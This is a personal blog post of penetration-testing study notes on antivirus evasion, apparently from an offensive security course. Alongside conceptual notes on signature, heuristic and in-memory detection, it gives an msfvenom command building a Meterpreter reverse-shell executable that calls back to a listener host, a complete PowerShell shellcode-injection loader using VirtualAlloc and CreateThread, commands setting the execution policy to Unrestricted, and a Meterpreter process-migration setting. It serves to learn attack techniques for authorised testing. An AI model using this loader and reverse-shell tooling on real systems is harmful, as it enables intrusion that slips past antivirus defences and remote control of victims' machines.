---
title: Study Notes - 2021/03/24
date: 2021-03-23 23:17:57
tags: [Penetration Testing, Study Notes]
---

# Antivirus Evasion  
First generate a reverse shell:  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f exe > binary.exe  

https://www.virustotal.com/#/home/upload  

# Detection Method 

## Signiture-based  
blacklist technology  
a cotinuous series of bytes that uniquely identify it -> change or obfuscating the content 
## Heuristic and Behavioral-Based Detection  

Heuristic-Based Detection is a detection method that relies on various rules and algorithms to determine whether or not an action is considered malicious

Behavioral-Based: This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, and looking for behaviors or actions that are considered malicious.

# Bypassing 
## On-disk evasion 
Packers, smaller, functional equivalent -> new signiture, bypass older antivirus detection  

### Obfuscator
Re-organize and mutate code, more difficult to reverse engineer , dead code

### Cypters 
Add a decryption step, in memory decryotion, invisible to malware detection


virtualmachine emulation detection, detect if it is executed in a virtual machine envrionment  

### Software Protectors 


## in-memory evasion 
PE injection, manipulation of its own memory, does not write any thing to disk  

### Remote Process Memory Injection  
### Reflective DLL injection  
write their own version of api to load in memory dll  

### Process Hollowing 
suspend a benign process, then image changed, resume executon 

### Inline Hook
modify memory, inject a hook, handler, to malicious code  

# Practical example  
Target a specific anti-virus product 

# in-memory injection  
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
$winFunc =
Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
[Byte[]];
[Byte[]]$sc = <place your shellcode here>;
$size = 0x1000;
if ($sc.Length -gt 0x1000) {$size = $sc.Length};
$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i),
$sc[$i], 1)};
$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

use load code into the memory, then execute with create thread. in powershell script 

prevent from execution:
```
C:\Users\offsec\Desktop> powershell .\av_test.ps1
.\av_test.ps1 : File C:\Users\offsec\Desktop\av_test.ps1 cannot be loaded because
running scripts is disabled on this
system. For more information, see about_Execution_Policies at
http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ .\av_test.ps1
+ ~~~~~~~~~~~~~
+ CategoryInfo : SecurityError: (:) [], PSSecurityException
+ FullyQualifiedErrorId : UnauthorizedAccess


C:\Users\offsec\Desktop> powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Undefined
PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope
CurrentUser
PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
Unrestricted
```

# Shelter
stealth mode: restore the execution of original flow after finish the injected code  

Session died after original code exit 

we can set up an AutoRunScript to migrate our Meterpreter to a separate process immediately after session creation
```
set AutoRunScript post/windows/manage/migrate
```

